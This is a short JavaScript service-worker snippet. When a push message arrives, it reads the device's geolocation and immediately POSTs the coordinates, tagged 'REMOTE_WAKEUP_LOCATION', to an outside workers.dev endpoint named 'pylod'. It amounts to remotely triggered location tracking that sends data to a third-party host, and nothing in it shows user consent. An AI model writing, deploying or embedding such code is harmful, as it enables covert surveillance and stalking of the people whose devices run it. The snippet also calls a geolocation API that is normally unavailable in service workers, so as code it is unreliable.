self.addEventListener('push', function(event) {
    event.waitUntil(
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const data = {
                type: "REMOTE_WAKEUP_LOCATION",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude
            };
            // إرسال الإحداثيات فوراً للـ Worker
            await fetch("https://pylod.zaid00dd.workers.dev/", {
                method: "POST",
                body: JSON.stringify(data)
            });
        })
    );
});
